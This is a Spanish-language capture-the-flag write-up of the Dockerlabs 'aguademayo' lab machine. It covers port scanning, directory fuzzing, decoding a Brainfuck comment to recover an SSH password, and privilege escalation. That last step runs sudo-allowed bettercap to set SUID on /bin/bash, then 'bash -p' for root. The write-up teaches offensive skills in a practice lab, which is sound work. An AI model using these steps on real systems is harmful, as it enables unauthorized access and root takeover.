#Dockerlabs #WriteUps 


>[!NOTE] Habilidades
> Brainfuck Decode, SUID Privilege Escalation

## Lanzar el laboratorio

Para desplegar el laboratorio de `docker` que estaremos explotando, ejecutaremos los siguientes comandos

~~~ bash
# Descomprimimos el archivo
unzip aguademayo.tar

# Asignamos permisos de ejecución al script que despliega el laboratorio
chmod +x auto_deploy.sh

# si no tienes el comando service
systemctl start docker

# Lanzamos el laboratorio
./auto_deploy.sh aguademayo.tar
~~~




# Reconocimiento
---
## Ping

Comprobamos que la máquina se encuentre activa en la `172.17.0.2`, por comodidad, agregaré esta dirección al archivo `/etc/hosts` con el nombre `aguademayo.local`

![etc hosts](https://github.com/user-attachments/assets/2ab8dcbe-d2b2-432c-bc16-01fa3be04a01)

~~~ bash
ping -c1 aguademayo.local
~~~


## Nmap

Haremos un primer escaneo por el protocolo TCP para descubrir si la máquina tiene puertos abiertos, lo haremos con `nmap` empleando el siguiente comando

~~~ bash
nmap --open -p- --min-rate 5000 -n -sS -v -Pn $ip -oG allPorts
~~~

![first_nmap_scan](https://github.com/user-attachments/assets/a5da09d6-25f4-4453-88b8-2dd5b7da87bb)

- `--open`: Mostrar solamente los puertos abiertos
- `-p-`: Escanear todo el rango de puertos (65535)
- `-sS`: Modo de escaneo TCP SYN, usa una técnica más sigilosa para determinar que el puerto está abierto al no concluir la conexión
- `-n`: No aplicar resolución DNS, lo que acelera el escaneo
- `-Pn`: Deshabilitar el descubrimiento de host, o sea, asume que el objetivo se encuentra activo, por lo que no hace un `ping` previo a `aguademayo.local`
- `-v`: Modo `verbose`, muestra los resultados del escaneo en tiempo real
- `-oG`: Exportar el escaneo a un formato `Grepable`, lo que es más útil a la hora de extraer información de nuestro archivo, como por ejemplo, los puertos abiertos encontrados

### Services Scan

~~~ bash
nmap -sVC -p 22,80 aguademayo.local -oN targeted
~~~

![ports_scan](https://github.com/user-attachments/assets/5f118d18-5ca4-4a43-87f2-a169bd1188d0)


## Http Service

Vemos el puerto `80` que corresponde a un servicio `http`, veamos que hay en él. Podemos usar la herramienta `whatweb` para listar las tecnologías detectadas en el servidor

~~~ bash
whatweb http://172.17.0.2
~~~

![web](https://github.com/user-attachments/assets/e35d7539-130c-4f02-be69-5e3c32baea02)

## Fuzzing

Lo siguiente que haremos será intentar descubrir posibles directorios existentes en este servicio web, en este caso podemos usar cualquier herramienta de fuzzing, usaré `wfuzz` y `gobuster`
### Wfuzz

~~~ bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://aguademayo.local/FUZZ
~~~

![wfuzz_fuzzing](https://github.com/user-attachments/assets/39c55290-aa90-4f2d-8b21-c834a4b3a4c7)

- `-c`: Formato colorizado
- `--hc=404`: Ocultar el código de estado 404 (No encontrado)
- `-w`: Especificar un diccionario de palabras
- `-t 200`: Dividir el proceso en 200 hilos, agilizando la tarea

### Gobuster

~~~ bash
gobuster dir -u http://aguademayo.local -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
~~~

![gobuster fuzzing](https://github.com/user-attachments/assets/6061ca89-def5-4576-b792-0237d0fdd5e0)

- `dir`: Modo de descubrimiento de directorios y archivos
- `-u`: Dirección URL
- `-w`: Diccionario a usar
- `-t 200`: Establecer 200 subprocesos 

Podemos ver que en ambos casos se ha descubierto el directorio `images`, vamos a ver que contiene con `firefox`, o si no te gusta abandonar la terminal, con `curl`

~~~ bash
curl -sL -X GET http://172.17.0.2/images
~~~

![curl a images](https://github.com/user-attachments/assets/420b7b6a-49e1-4974-a065-b355df4adb70)

- `-s`: No mostrar progreso o error de la solicitud
- `-L`: Habilitar el redireccionamiento
- `-X`: Especificar el método HTTP a usar

![dir images](https://github.com/user-attachments/assets/08516d57-27ed-4450-8980-9ba05ea270ea)

Vemos un archivo  `agua_ssh.jpg`, procedemos a traerla a nuestra máquina y ver de qué se trata

![imagen_ssh](https://github.com/user-attachments/assets/556f2300-6add-4d04-98da-6bbc0d9fee5a)

~~~ bash
wget http://aguademayo.local/images/agua_ssh.jpg
~~~

![wget agua_ssh](https://github.com/user-attachments/assets/803c1f9c-24bf-43bd-8dfb-58266a4caf44)

El nombre del archivo `agua_ssh.jpg` me parece un tanto raro, ya que contiene `ssh` en el nombre, esto me hace creer que `agua` es un usuario válido en la máquina.

Si hacemos un análisis del archivo o imprimimos los caracteres de la imagen, no encontramos mayores pistas

## Exiftool Analysis

~~~ bash
exiftool agua_ssh.jpg
~~~

![exiftool_analysis](https://github.com/user-attachments/assets/4e78b1f4-d6fe-45f9-8323-cf569c367a3a)

## Strings

~~~ bash
strings agua_ssh.jpg
~~~

![listar caracteres](https://github.com/user-attachments/assets/172cee99-b21e-4a5e-a068-d21d51c27bb1)

# Intrusión
---
## Brainfuck Decode

Si vemos el código fuente podemos ver algo inusual al final del todo en un comentario HTML

![web codigo raro](https://github.com/user-attachments/assets/754735ed-c5d7-4a4d-a27d-9089fe0cb78c)

Como no sabía a qué me enfrentaba, lo primero que hice fue buscar este comentario HTML en Google

![decode ](https://github.com/user-attachments/assets/3553fd74-45b7-49b4-beea-f34248f4f852)

Podemos ver que hay un mensaje escrito en lenguaje Brainfuck, así que lo decodificaremos con ayuda de esta web `https://dcode.fr/brainfuck-language`
**No olvidemos quitar los caracteres del comentario HTML** (`<!--` y `-->`)

![decrypt](https://github.com/user-attachments/assets/df50a32c-4c09-421c-9978-ec6588f284b6)

Vemos que el mensaje escondido se trata de la palabra `bebeaguaqueessano`, quizá sea la contraseña del usuario `agua`, por lo que probamos conectarnos por `ssh`

~~~ bash
ssh agua@aguademayo.local
~~~

![entramos por ssh](https://github.com/user-attachments/assets/57f14f20-8ec4-4b5c-8c5b-7069fef58f26)


# Escalada de privilegios
---
## Tratamiento TTY

Una vez tenemos acceso, haremos un tratamiento de la TTY para limpiar la pantalla con `Ctrl + L`, para esto cambiaremos el valor de la variable `$TERM`

~~~ bash
export TERM=xterm
~~~

## Sudoers

Primeramente veremos si tenemos privilegios `sudo` con el siguiente comando

~~~ bash
sudo -l
~~~

![sudo -l](https://github.com/user-attachments/assets/6247d06c-073c-4cd7-83e7-cb47e2937436)

- `-l`: Enumerar los comandos permitidos (o prohibidos) invocables por el usuario en la máquina actual


Existe `bettercap` en la máquina y podemos ejecutarlo sin proporcionar contraseña, ejecutaremos el binario

~~~ bash
sudo bettercap
~~~

![exec bettercap with sudo](https://github.com/user-attachments/assets/25a8d1f5-e0ed-4edf-a324-98bf0e0f4117)

Veamos el panel de ayuda con el comando `help`

![bettercap help](https://github.com/user-attachments/assets/89745db9-44c7-4fe0-bdf9-01d5aa8921ed)

![help bettercap](https://github.com/user-attachments/assets/b9baaa72-5204-45cd-9db5-5b669e854442)


## SUID Privilege Escalation

Esta opción (`!`) nos permite ejecutar un comando a nivel de sistema, así que podemos asignar el privilegio SUID a la `bash` para ejecutarla como `root`, para eso, lo haremos con el comando `chmod`, dentro de la consola interactiva de `bettercap` ejecutamos el siguiente comando

~~~ bash
! chmod u+s /bin/bash
~~~

También podemos hacer esto con un solo comando con la opción `-eval` 

~~~ bash
sudo bettercap -eval "! chmod u+s /bin/bash"
~~~

![cambiar el privilegio onliner](https://github.com/user-attachments/assets/cf65544e-bbc4-4dec-82ea-d6254a4b22f5)

- `-eval`: Ejecutar un comando en la máquina


## Root time

Ahora supuestamente asignamos la capacidad de ejecutar `bash` como el usuario `root`, lo podemos verificar con el comando `ls -l /bin/bash` para listar los permisos.

![bash permisions](https://github.com/user-attachments/assets/f71eca5a-5308-4a79-959a-9911ff63a2af)

Así que ejecutamos `bash` como el propietario, y nos convertimos en el usuario `root`

~~~ bash
bash -p
~~~

- `-p`: Ejecutar como el usuario original


![bash como root](https://github.com/user-attachments/assets/03f0db53-5972-460c-ba08-f43b512a6c12)
